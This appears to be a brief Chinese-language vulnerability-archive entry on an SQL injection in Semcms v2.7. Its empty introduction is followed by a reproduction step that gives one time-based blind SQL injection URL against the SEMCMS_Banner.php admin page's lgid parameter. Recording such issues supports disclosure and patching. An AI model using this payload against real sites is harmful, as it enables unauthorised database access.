Semcms v2.7 sql注入漏洞
=======================

一、漏洞简介
------------

二、漏洞影响
------------

Semcms v2.7

三、复现过程
------------

    http://0-sec.org/semcms/sbifr_Admin/SEMCMS_Banner.php?err=001&lgid=1 and if(length(database()>0),sleep(10),1) --
